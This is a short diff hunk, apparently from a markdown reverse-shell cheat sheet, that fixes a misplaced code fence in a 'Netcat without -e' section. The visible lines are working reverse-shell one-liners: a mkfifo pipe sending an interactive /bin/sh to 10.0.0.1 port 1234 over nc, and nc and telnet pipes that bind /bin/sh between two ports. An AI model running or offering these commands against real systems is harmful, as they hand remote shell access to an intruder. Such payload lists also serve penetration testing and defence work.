@@ -138,7 +138,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp
 ##### Netcat without -e #2
 ```bash
 nc localhost 443 | /bin/sh | nc localhost 444
-telnet localhost 443 | /bin/sh | telnet localhost 444```
+telnet localhost 443 | /bin/sh | telnet localhost 444
 ```
 
 ##### Java
